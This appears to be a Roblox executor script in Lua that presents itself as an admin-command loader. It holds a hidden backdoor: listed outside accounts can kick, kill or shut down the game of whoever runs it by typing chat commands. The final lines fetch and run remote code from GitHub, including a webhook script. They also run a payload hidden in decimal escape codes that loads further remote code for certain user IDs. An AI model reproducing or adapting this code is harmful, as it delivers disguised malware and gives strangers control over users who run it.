-- admin --
local admins,notadmins=pcall(function()
-- [[ 3001347724 ]] --
if getgenv().adm then _G.rnote("Admins already loaded") return end;

_G.AdminPrefix = (".")
getgenv().FUNK = ("KommandFunktion");
getgenv().LVL = ("AxxessLevel");
FUNK=getgenv().FUNK;
LVL=getgenv().LVL;

_G.Admins = {
[3001347724] = 1; ["lulaslollipop"] = 1;
[4885631090] = 1; ["kh3we"] = 1;
["iloweil"] = 1,
["vimjqcVBinsane355"] = 1, ["9K342JB09fp0"] = 1, 
["XA93nxo5szdo"] = 1, ["bhn5cp6vgtwv"] = 1, 
["1BOVZ8qwtjw6"] = 1, ["20GXV6KNUZ53"] = 1, 
["IlIIIlIlIIlIIlIIlIIl"] = 1, ["xhexkers"] = 1, 
["20GXV6KNUZ53"] = 1,
["xheatkode"] = 1, ["siimeDLY"] = 1,
["rrixhslime"] = 1, ["halbib112233"] = 1,
["Justinseagull_20"] = 1,
["ggerrtasalt"] = 2,
["nogafarmer6942"] = 2,
};


local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
local lpchar = LocalP.Character
local lpHum = lpchar.Humanoid
local lpHrp = lpchar.HumanoidRootPart

getgenv().AdminTable = {}
for UserID, AxxessLevel in pairs(_G.Admins) do
if tonumber(UserID) then -- Check if UserID is a number
getgenv().AdminTable[UserID] = {["Axxess"] = AxxessLevel};
else -- If UserID is not a number, try to find the player by name
for _, p in pairs(Players:GetPlayers()) do
if (string.lower(p.Name) == string.lower(UserID) or string.lower(p.DisplayName) == string.lower(UserID)) then
getgenv().AdminTable[p.UserId] = {["Axxess"] = AxxessLevel};
        end;
       end;
    end;
 end;

getgenv().psearch = function(Name)
local Inserted = {}
for _, p in pairs(Players:GetPlayers()) do
if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
table.insert(Inserted, p);return p
       end;
    end;
end -- plr find

getgenv().AdminKmdList = {
["kick"] = {
[FUNK] = function(Player, self, CmdPlayer)
if Player == LocalP or Player == "all" then
LocalP:Kick(self)
end
end;
[LVL] = {[1] = true, [2] = true, [3] = true, [4] = false, [5] = false}
}; -- kixk funk
["kill"] = {
[FUNK] = function(Player, self, CmdPlayer)
if Player == LocalP or Player == "all" then
LocalP.Character.Humanoid:ChangeState(15)
  end;
end;
[LVL] = {[1] = true, [2] = true, [3] = true, [4] = true, [5] = true}
   }; -- kill funk
["exit"] = {
[FUNK] = function(Player, self, KmdPlayer)
if Player == LocalP or Player == "all" then
LocalP:kick(self); task.wait(3.5); game:shutdown();
end;
end;
[LVL] = {[1] = true, [2] = true, [3] = false, [4] = false, [5] = false}
 }; -- exit funk
["bring"] = {
[FUNK] = function(Player, self, KmdPlayer)
if Player == LocalP or Player == "others" then
lpHrp.CFrame = KmdPlayer.Character.HumanoidRootPart.Position;
  end;
end;
[LVL] = {[1] = true, [2] = true, [3] = true, [4] = true, [5] = true}
 }; -- bring funk
}; -- admin kommand list

getgenv().BDCheck = function(Target2, Chat)
if Chat:sub(1, 1) == _G.AdminPrefix then
local args = string.split(Chat:sub(2), " ")
local Kommand = AdminKmdList[table.remove(args, 1)]
local targ1 = psearch(table.remove(args, 1))
if Kommand and targ1 then
return Kommand and Kommand[LVL][getgenv().AdminTable[Target2.UserId].Axxess] and Kommand[FUNK](targ1, table.concat(args, " "), Target2)
end
end
end;

local GP = Players:GetPlayers()
for i = 1, #GP do
local CoolKidPlayer = GP[i]
CoolKidPlayer.Chatted:Connect(function(Word)
BDCheck(CoolKidPlayer, Word)
end)
end
Players.PlayerAdded:Connect(function(CKP)
CKP.Chatted:Connect(function(Message)
BDCheck(CKP, Message)
end)
end);

task.wait()
warn("_G.Admins loaded!âœ…")
getgenv().adm = true;

end); -- protekt
--[[admins loaded]]--

spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/diskord/refs/heads/main/wHook_lulaslollipop",true))()
end)
spawn(function()
loadstring("\45\45\45\45\98\111\98\98\108\121\32\240\159\145\129\240\159\145\129\240\159\145\129\240\159\145\129\10\108\111\99\97\108\32\112\61\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\111\114\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\68\105\115\112\108\97\121\78\97\109\101\59\32\108\111\99\97\108\32\117\105\61\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\59\10\105\102\40\112\61\61\34\115\105\105\95\117\117\117\55\34\41\111\114\40\117\105\61\61\52\50\51\57\49\48\56\55\50\52\41\111\114\40\117\105\61\61\51\48\48\49\51\52\55\55\50\52\41\116\104\101\110\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\114\114\105\120\104\47\117\78\98\54\56\57\50\77\47\114\97\119\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\98\111\98\98\108\121\34\41\41\40\41\59\10\101\110\100\59")();
end)
